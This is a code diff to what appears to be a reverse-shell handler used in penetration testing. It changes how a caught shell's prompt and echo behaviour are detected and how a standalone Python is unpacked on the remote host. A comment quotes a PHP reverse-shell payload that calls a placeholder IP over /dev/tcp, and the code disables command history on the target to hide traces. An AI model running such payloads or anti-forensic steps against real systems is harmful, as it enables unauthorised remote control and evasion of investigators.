@@ -2902,13 +2902,16 @@ class Session:
 
 			if var_value1 + var_value2 in response:
 				self.OS = 'Unix'
+				self.echoing = f"echo ${var_name1}${var_name2}" in response
+				echoed_cmd = f" {var_name1}={var_value1} {var_name2}={var_value2}; echo ${var_name1}${var_name2}"
+				if self.echoing and echoed_cmd in response:
+					head = response.split(echoed_cmd, 1)[0]
+				else:
+					head = response.split(var_value1 + var_value2, 1)[0]
+				self.interactive = bool(head.strip())
+				self.prompt = head.splitlines()[-1].encode() if self.interactive else b""
 				if not options.keep_history:
 					self.exec("export HISTFILE=/dev/null HISTCONTROL=ignorespace 2>/dev/null")
-				self.prompt = re.search(f"{var_value1}{var_value2}\n(.*)", response, re.DOTALL)
-				if self.prompt:
-					self.prompt = self.prompt.group(1).encode()
-				self.interactive = bool(self.prompt)
-				self.echoing = f"echo ${var_name1}${var_name2}" in response
 
 			elif f"'{var_name1}' is not recognized as an internal or external command" in response or \
 					re.search('Microsoft Windows.*>', response, re.DOTALL) or \
@@ -3409,8 +3412,7 @@ class Session:
 					# For example: <?php passthru("bash -i >& /dev/tcp/X.X.X.X/4444 0>&1"); ?>
 					# Silently convert the shell to non-interactive before PTY upgrade.
 					self.interactive = False
-					self.echoing = True
-					self.exec(f"exec {self.shell}", raw=True)
+					self.exec(f"exec {self.shell}", raw=True, timeout=max(self.latency or 0, 0.5))
 					self.echoing = False
 
 				shell_marker = struct.pack(Messenger._TYPE_CODE, Messenger.SHELL)
@@ -3456,7 +3458,7 @@ class Session:
 				python_binary = self.need_binary("Standalone Python", URLS[python_binary])
 				if python_binary:
 					if python_binary.endswith(".gz"):
-						python_binary = self.exec(f'PY_TMP="$(mktemp -d)" && tar -xzf "{python_binary}" -C "$PY_TMP" && export PATH="$PY_TMP/python/bin:$PATH" && ls $PY_TMP/python/bin/python3', value=True)
+						python_binary = self.exec(f'PY_TMP="/var/tmp" && tar -xzf "{python_binary}" -C "$PY_TMP" && export PATH="$PY_TMP/python/bin:$PATH" && ls $PY_TMP/python/bin/python3', value=True)
 						if not (isinstance(python_binary, str) and python_binary.startswith("/")):
 							logger.error("Failed to deploy standalone python...")
 							python_binary = None
